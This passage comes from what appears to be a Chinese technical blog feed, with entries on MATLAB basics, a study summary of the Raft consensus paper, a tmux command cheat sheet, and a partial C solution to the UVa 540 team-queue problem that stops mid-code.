<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">N = <span class="number">100</span>;</span><br><span class="line">f(<span class="number">1</span>) = <span class="number">1</span>;</span><br><span class="line">f(<span class="number">2</span>) = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> n = <span class="number">3</span>:N</span><br><span class="line">    f(n) = f(n<span class="number">-1</span>) + f(n<span class="number">-2</span>);</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">f(<span class="number">1</span>:<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>然后就是条件表达式，如下</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">num = randi(<span class="number">100</span>)</span><br><span class="line"><span class="keyword">if</span> num &lt; <span class="number">34</span></span><br><span class="line">   sz = <span class="string">&#x27;low&#x27;</span></span><br><span class="line"><span class="keyword">elseif</span> num &lt; <span class="number">67</span></span><br><span class="line">   sz = <span class="string">&#x27;medium&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   sz = <span class="string">&#x27;high&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="帮助和文档"><a class="header-anchor" href="#帮助和文档">¶</a>帮助和文档</h2>
<p>​	如下</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">doc <span class="built_in">mean</span> <span class="comment">%在单独的窗口打开函数文档</span></span><br><span class="line"><span class="built_in">mean</span>(  <span class="comment">%此时会提示相应函数语法</span></span><br><span class="line">help <span class="built_in">mean</span>  <span class="comment">%在命令行窗口中打开函数简明文档</span></span><br></pre></td></tr></table></figure>
<h2 id="矩阵和幻方矩阵"><a class="header-anchor" href="#矩阵和幻方矩阵">¶</a>矩阵和幻方矩阵</h2>
<ol>
<li>
<p>创建矩阵的方法很多，可以输入明确列表，可以从外界文件加载，可以通过内置函数生成矩阵，也可以自己写函数创建。</p>
</li>
<li>
<p>可以用**sum()<strong>函数对矩阵的每一行进行求和，用</strong>diag()**函数可以获取矩阵主对角线上的元素，**fliplr()**函数原本用于图形的从左到右翻转，也可以用来翻转矩阵。</p>
</li>
<li>
<p>**magic()**函数可以生成任意大小的幻方矩阵，另外就是可以通过指定行列顺序来对矩阵进行变换，例如</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">&gt;&gt; B=A([<span class="number">1</span> <span class="number">3</span> <span class="number">2</span> <span class="number">4</span>],[<span class="number">1</span> <span class="number">2</span> <span class="number">4</span> <span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">B =</span><br><span class="line"></span><br><span class="line">    <span class="number">16</span>     <span class="number">3</span>    <span class="number">13</span>     <span class="number">2</span></span><br><span class="line">     <span class="number">9</span>     <span class="number">6</span>    <span class="number">12</span>     <span class="number">7</span></span><br><span class="line">     <span class="number">5</span>    <span class="number">10</span>     <span class="number">8</span>    <span class="number">11</span></span><br><span class="line">     <span class="number">4</span>    <span class="number">15</span>     <span class="number">1</span>    <span class="number">14</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>然后就是可以通过上文提到的函数生成基本矩阵，比如<strong>zeros</strong>，<strong>ones</strong>，<strong>rand</strong>，<strong>randn</strong>，其中后面两个分别生成均匀分布的随机元素和正态分布的随即元素</p>
</li>
</ol>
<h2 id="表达式"><a class="header-anchor" href="#表达式">¶</a>表达式</h2>
<ol>
<li>matlab的表达式基本都涉及矩阵</li>
<li>可以用**[]**进行构造表</li>
<li>matlab给了很多初等函数和高等函数，可以用help elfun查看初等函数，用help specfun查看高等函数</li>
</ol>
<h2 id="输入命令-v2"><a class="header-anchor" href="#输入命令-v2">¶</a>输入命令</h2>
<ol>
<li>主要说的是<strong>format</strong>函数，用来控制显示的数值格式</li>
</ol>
<h2 id="索引"><a class="header-anchor" href="#索引">¶</a>索引</h2>
<ol>
<li>
<p>下标这块内容在前面已经记录过了</p>
</li>
<li>
<p>**😗*运算符可以用来引用部分矩阵，可以用来获取非单位间距的行向量</p>
</li>
<li>
<p>串联之前也提过了</p>
</li>
<li>
<p>要想删除行和列，可以用方括号为指定行赋值，如</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">&gt;&gt; A(:,<span class="number">2</span>)=[]</span><br><span class="line">A =</span><br><span class="line">    <span class="number">16</span>     <span class="number">2</span>    <span class="number">13</span></span><br><span class="line">     <span class="number">5</span>    <span class="number">11</span>     <span class="number">8</span></span><br><span class="line">     <span class="number">9</span>     <span class="number">7</span>    <span class="number">12</span></span><br><span class="line">     <span class="number">4</span>    <span class="number">14</span>     <span class="number">1</span></span><br><span class="line">&gt;&gt; A(<span class="number">2</span>,:)=[]</span><br><span class="line">A =</span><br><span class="line">    <span class="number">16</span>     <span class="number">2</span>    <span class="number">13</span></span><br><span class="line">     <span class="number">9</span>     <span class="number">7</span>    <span class="number">12</span></span><br><span class="line">     <span class="number">4</span>    <span class="number">14</span>     <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>如果想要删除某个元素，结果不再是矩阵，但是可以通过单一下标进行删除，并将结果重构为一个行向量。例如</p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">&gt;&gt; <span class="built_in">ans</span></span><br><span class="line"><span class="built_in">ans</span> =</span><br><span class="line">    <span class="number">16</span>     <span class="number">5</span>     <span class="number">9</span>     <span class="number">4</span></span><br><span class="line">     <span class="number">3</span>    <span class="number">10</span>     <span class="number">6</span>    <span class="number">15</span></span><br><span class="line">     <span class="number">2</span>    <span class="number">11</span>     <span class="number">7</span>    <span class="number">14</span></span><br><span class="line">    <span class="number">13</span>     <span class="number">8</span>    <span class="number">12</span>     <span class="number">1</span></span><br><span class="line">&gt;&gt; <span class="built_in">ans</span>(<span class="number">9</span>:<span class="number">10</span>)=[]</span><br><span class="line"><span class="built_in">ans</span> =</span><br><span class="line">    <span class="number">16</span>     <span class="number">3</span>     <span class="number">2</span>    <span class="number">13</span>     <span class="number">5</span>    <span class="number">10</span>    <span class="number">11</span>     <span class="number">8</span>     <span class="number">7</span>    <span class="number">12</span>     <span class="number">4</span>    <span class="number">15</span>    <span class="number">14</span>     <span class="number">1</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>对于逻辑下标，假定X是一个普通矩阵，L是一个由某个逻辑运算生成的同等大小的矩阵，由X(L)指定X的元素，其中L元素非0。这里提到了几个函数，比如<strong>isfinite(x)</strong>，对于有限项，该值为1，否则为0。还有<strong>std(x)</strong>，用来求标准差。还有<strong>isprime(x)</strong>，判断是否为素数。还有<strong>find</strong>函数，返回行向量，用来确定与逻辑条件相符的数组元素的索引。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>数学</category>
        <category>数学建模</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>数学建模</tag>
      </tags>
  </entry>
  <entry>
    <title>raft论文学习</title>
    <url>/2022/01/18/raft%E8%AE%BA%E6%96%87%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1>前言</h1>
<p>​	从tinykv的Project2部分就开始正式到了分布式数据库的部分，所以接下来一段时间需要先了解一下Raft论文，主要参考GitHub上的中文翻译<a href="https://github.com/maemual/raft-zh_cn/blob/master/raft-zh_cn.md">Raft论文中文版</a>，以及原文<a href="https://ramcloud.atlassian.net/wiki/download/attachments/6586375/raft.pdf">In Search of an Understandable Consensus Algorithm</a>，大概简单地熟悉一下Raft算法的思想即可，然后再依据tinykv的实现去熟悉一些更具体的东西。</p>
<p>​	这篇论文详细的介绍了斯坦福大学的研究人员为了解决Paxos难度过高难以理解而开发出的分布式共识算法。</p>
<h1>背景</h1>
<p>​	一致性算法（consensus algorithm）可以说是分布式系统的根基，它保证了一组机器能够像一个机器一样工作，即使其中某些机器出现故障也能正常工作下去。</p>
<p>​	主流的一致性算法就是Paxos和Raft，前者本身太过复杂，并且难以应用到实际生产中，而Raft算法没有Paxos的这些缺点，它实际上是很容易理解的。</p>
<h1>前置知识</h1>
<p>​	根据之前的学习，我们知道分布式系统有如下四个挑战：</p>
<ol>
<li>时序性（Timing），运行在不同网络下的机器中的进程如何判断一些事件发生的顺序</li>
<li>并发性（Concurrency），不同网络下的机器如何共享资源互不干扰</li>
<li>健壮性（Robustness），应对网络和硬件的不稳定性</li>
<li>一致性（Consistency），无论访问哪个结点，都能得到相同的结果</li>
</ol>
<p>​    比较重要的一点，<strong>共识（Consensus）</strong>，即多个节点之间彼此对某个状态达成一致。</p>
<p>​	当然除了上面的四个挑战，也有一些比较重要的东西，比如<strong>高可用HA（High Availability）</strong>，指的是通过某种设计来减少系统不能提供服务的时间。为了使进程实现高可用，主要有如下两种方法：</p>
<ul>
<li><strong>State Transfer</strong>，主服务器将完整状态内容传输给备份服务器</li>
<li><strong>Replicated State Machine</strong>，将需要备份的服务器视为一个确定性状态机 ——主备以相同的状态启动，以相同顺序导入相同的输入，最后它们就会进入相同的状态、给出相同的输出</li>
</ul>
<p>​    后者是比较常用的方式，常见架构如下图</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326164002639.png" alt="image-20220326164002639"></p>
<p>​	四个操作含义如下：</p>
<ol>
<li>客户端向服务端发送请求</li>
<li>公式模块将该操作以<strong>日志</strong>的形式被分到其他备份服务器上</li>
<li>当日志安全备份后，指定操作被应用到状态机上</li>
<li>服务端返回操作结果到客户端</li>
</ol>
<p>​    在上面这个流程中，可以认为分布式共识算法就是要<strong>按照固定的顺序将指定的日志内容备份到集群的其他实例上</strong></p>
<p>​	下面开始正文</p>
<h1>Raft算法的名词</h1>
<p>​	首先在Raft算法建立的模型中，结点有三类，分别是<strong>Leader、Follower、Candidate</strong>，分别有以下作用：</p>
<ul>
<li>Leader结点负责从客户端接收新的日志记录然后备份到其他服务器上，名且在<strong>日志安全备份之后</strong>让其他服务器将该日志记录应用到其上层状态机</li>
<li>Candidate结点会在选举Leader时作为一个备选的人</li>
<li>Follower结点自身不会发出请求，只接收剩下两类结点发出的请求</li>
</ul>
<p>​    在使用这种架构的时候，需要解决的问题被拆分成了下面三个问题：</p>
<ul>
<li><strong>Leader选举</strong>：现有的Leader可能会挂掉，这个时候需要选新的</li>
<li><strong>日志备份</strong>：Leader结点从客户端接受日志，备份到其他服务器上</li>
<li><strong>安全性</strong>：主要是需要保证下面的几点：
<ul>
<li><strong>Election Safety</strong>（选举安全）：在任意给定的 Term 中，至多一个节点会被选举为 Leader</li>
<li><strong>Leader Append-Only</strong>（Leader 只追加）：Leader 绝不会覆写或删除其所记录的日志，只会追加日志</li>
<li><strong>Log Matching</strong>（日志匹配）：若两份日志在给定 Term 及给定 index 值处有相同的记录，那么两份日志在该位置及之前的所有内容完全一致</li>
<li><strong>Leader Completeness</strong>（Leader 完整性）：若给定日志记录在某一个 Term 中已经被提交（后续会解释何为“提交”），那么后续所有 Term 的 Leader 都将包含该日志记录</li>
<li><strong>State Machine Safety</strong>（状态机安全性）：如果一个服务器在给定 index 值处将某个日志记录应用于其上层状态机，那么其他服务器在该 index 值处都只会应用相同的日志记录</li>
</ul>
</li>
</ul>
<p>​    在结点之间有采用RPC请求，主要有<strong>AppendEntries RPC</strong>和<strong>RequestVote RPC</strong>，前者是Leader发出的，主要是向其他结点发出的一些信息或<strong>心跳</strong>，后者是候选人结点给自己拉票用的。</p>
<p>​	以上的这些概念在后文会详细解释，并展示更多的细节，现在先按字面意思理解就行，这里先说一个比较重要的概念</p>
<p>​	<strong>Term</strong>，Raft算法在运行的时候会把时间分为任意长度的Term，如下图</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326164027192.png" alt="image-20220326164027192"></p>
<p>​    每个Term的开头都会有一次Leader选举，胜出的就是这个Term的Leader。</p>
<p>​    Term 由单调递增的 Term ID 所标识，每个节点都会在内存中保存当前 Term 的 ID。每次节点间发生通信时，它们都会发出自己所保存的 Term ID；当节点从其他节点处接收到比自己保存的 Term ID 更大的 Term ID 值时，它便会更新自己的 Term ID 并进入 Follower 状态。</p>
<h1>Raft算法的流程</h1>
<p>​	根据我看论文的经验，直接从Raft算法的特点开始还是比较全退的，所以可以先看一下Raft算法的运行流程，然后再考虑一些细节的东西。</p>
<p>​	首先假设我们有三个结点，最初三个结点都是Follower状态，如果Follower在<strong>一段时间内</strong>没有收到来自Leader的AppendEntries RPC，它就会转变成Candidate结点来竞争领导者，这个时候的AppendEntries RPC就是所谓的<strong>心跳</strong>，是帮助其它结点检测Leader结点是否还活着的，所以说这个请求是并行发布的，并且是周期性的，其实命名成心跳是一个非常形象的说法😂，上文中加粗的一段时间指的是<strong>election timeout</strong>，这个时间是<strong>随机的</strong>，保证不会出现一些问题，如果超过这段时间Follower还没有听到Leader的心跳的话就认为Leader挂掉了，它就变成了Candidate。此外，Leader发出心跳到其他结点也有一个平均耗时，即<strong>broadcastTime</strong>，它是远小于前者的。</p>
<p>​	然后现在Candidate结点就可以开始拉票了，它向别的结点发送<strong>RequestVote RPC</strong>，如果接收到的结点没有给别人投过票，就把这个票投给它，<strong>为了简便起见，先这样认为吧</strong>，此外，在一个Term中每个Follower只能投给一个结点。在Candidate票数过半的时候他就变成了Leader。</p>
<p>​	另外的话上面的关于Term的示意图里似乎每个Term的开始都是election的时间，但大多数时候是不需要进行选举这个过程的，因为太消耗时间了。</p>
<p>​	当然，有时候会出现所有候选人选票相同，这个时候将会重新进行新的一轮投票，对应的就是Term定义图中的tm3</p>
<p>​	注意选票的过程中这个Term是不断更新的</p>
<img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/4.gif">
<p>​	上面的这个过程就是Raft要处理的第一个过程，就是所谓的<em><strong>Leader Election</strong></em></p>
<p>​	前文提到过所有客户要读写值都要通过Leader，现在比如Client给Leader传了一个set5，（如果这个时候因为某些原因Leader挂掉了，这条命令就没用了），然后Leader会通过<strong>AppendEntries RPC</strong>向其他结点发送这个日志信息，其他结点接收到之后，经过核验，得到了这条日志信息，然后就会给Leader返回一个成功的命令。如果整个集群中大多数结点都返回了成功，Leader就会认为这条命令被普遍接收，并将他commited到它的状态机里，在Leader结点commited成功之后，它会再下次的响应中传递给其它结点信息，让其它结点把这条命令应用到状态机中，整个过程如下</p>
<img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/3.gif">
<p>​	这个过程就是Raft算法要解决的第二个问题，即<strong>log replication</strong></p>
<p>​	关于Raft算法要解决的第三个问题，即安全性的问题，这里是依靠一些限制来实现的。</p>
<p>​	我们先看一个动画演示吧，这里是有五个结点，然后通过一些手段将它们分成两组，注意到如果有两个客户端对其发出不一样的信息的话，集群中将会出现状态不一致的问题，这个时候是以Term高的为准</p>
<img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/5.gif">
<p>​	上面大概就是Raft算法的应用场景，显然这是很粗糙的一个过程，下面将会介绍一些更加详细的内容</p>
<h1>Raft算法的详细说明</h1>
<h2 id="一些参数"><a class="header-anchor" href="#一些参数">¶</a>一些参数</h2>
<p>​	这里主要介绍一下上面提到的一些类型的参数</p>
<p>​	首先是集群结点的信息。</p>
<blockquote>
<p>​	所有节点都会持有的持久化状态信息（在响应 RPC 前会先将更新写入到持久存储）：<br>
- <code>currentTerm</code>：当前 Term ID（初值为 <code>0</code>）<br>
- <code>votedFor</code>: 该 Term 中已接收到来自该节点的选票的 Candidate ID<br>
- <code>log[]</code>: 日志记录。第一个日志记录的 index 值为 <code>1</code></p>
<p>​	所有节点都会持有的易失性状态信息：<br>
- <code>commitIndex</code>: 最后一个已提交日志记录的 index（初值为 <code>0</code>）<br>
- <code>lastApplied</code>: 最后一个已应用至上层状态机的日志记录的 index（初值为 <code>0</code>）</p>
<p>​	只有Leader 才会持有的易失性状态信息（会在每次选举完成后初始化）：<br>
- <code>nextIndex[]</code>: 每个节点接收到的下一个日志记录的 index（初值均为 Leader，最新日志记录 index 值 + 1）<br>
- <code>matchIndex[]</code>: 每个节点上已备份的最后一条日志记录的 index（初值均为 <code>0</code>）</p>
</blockquote>
<p>​	然后是两种请求的信息。</p>
<blockquote>
<p>​	<strong>AppendEntries RPC</strong>：由 Leader 进行调用，用于将日志记录备份至 Follower，同时还会被用来作为心跳信息</p>
<p>​	参数：<br>
- <code>term</code>: Leader 的 Term ID<br>
- <code>leaderId</code>: Leader 的 ID<br>
- <code>prevLogIndex</code>: 在正在备份的日志记录之前的日志记录的 index 值<br>
- <code>prevLogTerm</code>: 在正在备份的日志记录之前的日志记录的 Term ID<br>
- <code>entries[]</code>: 正在备份的日志记录<br>
- <code>leaderCommmit</code>: Leader 已经提交的最后一条日志记录的 index 值</p>
<p>​	返回值：<br>
- <code>term</code>: 接收方的当前 Term ID<br>
- <code>success</code>: 当 Follower 能够在自己的日志中找到 index 值和 Term ID 与 <code>prevLogIndex</code> 和 <code>prevLogTerm</code> 相同的记录时为 <code>true</code></p>
<p>​	接收方在接收到该 RPC 后会进行以下操作：</p>
<ol>
<li>若 <code>term &lt; currentTerm</code>，返回 <code>false</code></li>
<li>若日志中不包含index 值和 Term ID 与 <code>prevLogIndex</code> 和 <code>prevLogTerm</code> 相同的记录，返回 <code>false</code></li>
<li>如果日志中存在与正在备份的日志记录相冲突的记录（有相同的 index 值但 Term ID 不同），删除该记录以及之后的所有记录</li>
<li>在保存的日志后追加新的日志记录</li>
<li>若 <code>leaderCommit &gt; commitIndex</code>，令 <code>commitIndex</code> 等于 <code>leaderCommit</code> 和最后一个新日志记录的 index 值之间的最小值</li>
</ol>
<p>​    <strong>RequestVote RPC</strong>：由 Candidate 调用以拉取选票</p>
<p>​	参数：<br>
- <code>term</code>：Candidate 的 Term ID<br>
- <code>candidateId</code>: Candidate 的 ID<br>
- <code>lastLogIndex</code>: Candidate 所持有的最后一条日志记录的 index<br>
- <code>lastLogTerm</code>: Candidate 所持有的最后一条日志记录的 Term ID</p>
<p>​	返回值：<br>
- <code>term</code>：接收方的 Term ID<br>
- <code>voteGranted</code>：接收方是否同意给出选票</p>
<p>​	接收方在接收到该 RPC 后会进行以下操作：</p>
<ol>
<li>若 <code>term &lt; currentTerm</code>，返回 <code>false</code></li>
<li>若 <code>votedFor == null</code> 且给定的日志记录信息可得出对方的日志和自己的相同甚至更新，返回 <code>true</code></li>
</ol>
</blockquote>
<h2 id="日志备份"><a class="header-anchor" href="#日志备份">¶</a>日志备份</h2>
<p>​	先说一下日志的组成成分，先看下面这个图</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326164318214.png" alt="image-20220326164318214"></p>
<p>​	这就是所谓的日志，由若干日志记录组成，每个记录都包含着命令、index值以及自己所属的Term ID。</p>
<p>​	在整个日志备份的过程中，Raft提供了两个性质，这两条性质共同保证了安全性中的<strong>log Matching</strong>如下：</p>
<ul>
<li>对于两份日志中给定的 index 处，如果该处两个日志记录的 Term ID 相同，那么它们存储的状态机命令相同</li>
<li>如果两份日志中给定 index 处的日志记录有相同的 Term ID 值，那么位于它们之前的日志记录完全相同</li>
</ul>
<p>​    第一条性质是很显然的，第二条命令是因为在AppendEntries RPC处理过程中会有一个校对新日志之前的index和Term ID的过程，如果Follower没有找到的话就会拒绝这条记录，所以每一次AppendEntries RPC调用的成功返回都意味着Leader可以确定该 Follower 存储的日志直到该index处均与自己所存储的日志相同。</p>
<p>​	如果AppendEntries RPC没有这种日志检查则会出现各种各样的问题。有时候如果Leader崩了之后都会出现不一致性，如下图</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326164353114.png" alt="image-20220326164353114"></p>
<p>​	然后如果Leader发现有的Follower的日志和自己不一样的话，Raft会强制两者一致，这个时候Leader会尝试确定它与各个Follower一致的最后一个index值，然后将这之后所有的日志删除，再将自己的日志备份过去，具体有以下几步</p>
<ol>
<li>Leader 会为每个 Follower 维持一个 <code>nextIndex</code> 变量，代表 Leader 即将通过 AppendEntries RPC 调用发往该 Follower 的日志的 index 值</li>
<li>在刚刚被选举为一个 Leader 时，Leader 会将每个 Follower 的 <code>nextIndex</code> 置为其所保存的最新日志记录的 index 之后</li>
<li>当有 Follower 的日志与 Leader 不一致时，Leader 的 AppendEntries RPC 调用会失败，Leader 便对该 Follower 的 <code>nextIndex</code> 值减 1 并重试，直到 AppendEntries 成功</li>
<li>Follower 接收到合法的 AppendEntries 后，便会移除其在该位置上及以后存储的日志记录，并追加上新的日志记录</li>
<li>如此，在 AppendEntries 调用成功后，Follower 便会在该 Term 接下来的时间里与 Leader 保持一致</li>
</ol>
<p>​    显然的，这样保证了<em><strong>Leader Append-Only</strong></em>性质</p>
<h2 id="Leader-选举"><a class="header-anchor" href="#Leader-选举">¶</a>Leader 选举</h2>
<p>​	在上面已经简单介绍过了Leader选举的简单过程，这里再说一些细节，比如Candidate在拉票过程中有可能收到Leader的心跳或请求，这个时候要根据RPC请求中的Term ID和自身的大小关系来进行判断，如果自身较小，则成为Follower，否则继续拉票</p>
<p>​	此外，Leader选举也有一些约束，仅有日志备份方面的保证是不能保证所有的状态机都能按照相同的顺序执行命令的。有可能在某个Term中，某个Follower挂掉了，然后Leader没能把日志备份过去，后来它又好了，而且还成为了Leader，这种情况下就有日志发生了缺失。</p>
<p>​	Raft采用下面的机制来防止这一点：主要是限制拉票环节，在RequestVote RPC中附带了这个Candidate日志中最后一条记录的index值和Term ID值，其它结点接收到后会和自己的比较，如果对方日志落后，就会拒绝这次选票，实际上这保证了Candidate领先于集群中的大部分节点</p>
]]></content>
      <categories>
        <category>分布式系统</category>
        <category>Raft</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
        <tag>Raft</tag>
      </tags>
  </entry>
  <entry>
    <title>tmux</title>
    <url>/2021/10/20/tmux/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    为什么要学习Tmux呢？<del>因为我今天在编译Linux内核的时候因为花费时间太长而没有事干</del>，主要是为了能够同时运行多个命令行程序</p>
<h1 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install tmux</span><br></pre></td></tr></table></figure>
<h2 id="启动与退出"><a href="#启动与退出" class="headerlink" title="启动与退出"></a>启动与退出</h2><p>​    要启动的话直接在当前命令行窗口输入tmux即可，退出的话可以用快捷键<strong>Ctrl+D</strong>或输入<strong>exit</strong></p>
<h2 id="前缀键"><a href="#前缀键" class="headerlink" title="前缀键"></a>前缀键</h2><p>​    快捷键的前缀键为<strong>Ctrl+b</strong>，只有这样才能够使快捷键生效，<strong>Ctrl+b+?</strong>可以查看帮助文档</p>
<h2 id="会话管理"><a href="#会话管理" class="headerlink" title="会话管理"></a>会话管理</h2><ol>
<li><strong>tmux new -s name</strong>可以创建新的会话，每个会话都有编号0，1，2……</li>
<li><strong>tmux detach</strong>可以让当前会话与窗口分离，快捷键为<strong>Ctrl+b d</strong></li>
<li><strong>tmux ls</strong>可以查看当前所有的会话，快捷键为<strong>Ctrl+b s</strong></li>
<li><strong>tmux attach -t name</strong>可以重新接入某个已经存在的会话</li>
<li><strong>tmux kill-session -t name</strong>可以关闭某个会话</li>
<li><strong>tmux switch -t name</strong>可以用来切换会话</li>
<li><strong>tmux rename-session -t num name</strong>可以用来重命名，快捷键为<strong>Ctrl+b $</strong></li>
</ol>
<h1 id="高级操作"><a href="#高级操作" class="headerlink" title="高级操作"></a>高级操作</h1><h2 id="窗格操作"><a href="#窗格操作" class="headerlink" title="窗格操作"></a>窗格操作</h2><ol>
<li><strong>tmux split-window</strong>划分上下两个窗格，加参数<strong>-h</strong>划分左右，左右快捷键为<strong>%</strong>，上下快捷键为<strong>“</strong></li>
<li><strong>tmux select-pane</strong>移动窗格光标，加参数<strong>-U -D -L -R</strong>分别向上下左右移动，方向键也可以直接切换</li>
<li><strong>tmux swap-pane</strong>交换窗格位置，参数与上面一样</li>
<li>还有一些快捷键，比如<strong>x</strong>关闭当前窗格，<strong>!</strong>拆分出当前窗格，<strong>z</strong>全屏显示当前窗格，<strong>q</strong>显示当前窗格编号</li>
</ol>
<h2 id="窗口管理"><a href="#窗口管理" class="headerlink" title="窗口管理"></a>窗口管理</h2><ol>
<li><strong>tmux new-window -n name</strong>新建窗口</li>
<li><strong>tmux select-window -t name</strong>切换窗口</li>
<li><strong>tmux rename-window name</strong>为当前窗口起名或重命名</li>
<li>常用快捷键，<strong>c</strong>创建新窗口并显示多个窗口信息，<strong>p</strong>切换到上一个窗口，<strong>n</strong>切换到下一个窗口，<strong>num</strong>切换到指定编号的窗口，<strong>w</strong>从列表中选择窗口，<strong>,</strong>窗口重命名</li>
</ol>
<p><strong><em>注意：所有的快捷键都必须先按前缀键</em></strong></p>
<p><strong><em>参考：<a href="http://www.ruanyifeng.com/blog/2019/10/tmux.html">http://www.ruanyifeng.com/blog/2019/10/tmux.html</a></em></strong></p>
]]></content>
      <categories>
        <category>生产力工具</category>
      </categories>
      <tags>
        <tag>生产力工具</tag>
      </tags>
  </entry>
  <entry>
    <title>uva540 队列的使用</title>
    <url>/2021/08/16/uva540/</url>
    <content><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>​    有t个团队的人正在排一个长队。每次新来一个人时，如果他有队友在排队，那么新人会插队到最后一个队友的身后。如果没有任何一个队友排队，则他会被排到长队的队尾。 输入每个团队中所有队员的编号，要求支持如下3种指令： ENQUEUE x：编号为x的人进入长队 DEQUEUE：长队的队首出队 STOP：停止模拟 对于每个DEQUEUE指令，输出出队的人的编号。</p>
<h1 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h1><p>​    首先题目中给出了队员编号的范围，这就启发我们用一个数组根据下标存放，内容是队伍编号，然后为了更快，以时间换空间，开t个队列，然后每次入队的时候，根据入队编号，求出来是否有队员，这里需要三个数组，一个根据入队顺序来存储队伍编号，一个来根据队伍编号存放大数组中队头位置，一个存放队尾，如果有队员，直接插入到二维数组后面，否则先将队伍编号加入到队伍编号队列中，然后再插入。每次出队的时候，根据存放队伍变化数组的队头元素得到要出的队，将其队头增加，然后如果刚刚出的队空了，就将存放队伍编号的队列的队头增加，出队</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000010</span>], b[<span class="number">1010</span>][<span class="number">1010</span>], q1[<span class="number">1010</span>], q2[<span class="number">1010</span>], q[<span class="number">1010</span>];</span><br><span class="line"><span class="comment">//数组a用来存放最开始的数据，数组b是定义的t个队列，每次入队列时，判断进入哪个队列，数组q用来存储队列中的编号</span></span><br><span class="line"><span class="comment">//数组q1用来存储每个队列队尾的位置，数组q2用来存储每个队列队头的位置</span></span><br><span class="line"><span class="keyword">int</span> q1l = <span class="number">0</span>, q2l = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    q1l = <span class="number">0</span>;</span><br><span class="line">    q2l = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(q1, <span class="number">0</span>, <span class="keyword">sizeof</span>(q1));</span><br><span class="line">    <span class="built_in">memset</span>(q2, <span class="number">0</span>, <span class="keyword">sizeof</span>(q2));</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t, count = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);</span><br><span class="line">    <span class="keyword">while</span> (t)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Scenario #%d\n&quot;</span>, count);</span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= t; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> n;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> num;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">                a[num] = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        mem();</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> cmd[<span class="number">20</span>];</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, cmd);</span><br><span class="line">            <span class="keyword">if</span> (cmd[<span class="number">0</span>] == <span class="string">&#x27;S&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (cmd[<span class="number">0</span>] == <span class="string">&#x27;E&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> now, i;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;now);</span><br><span class="line">                <span 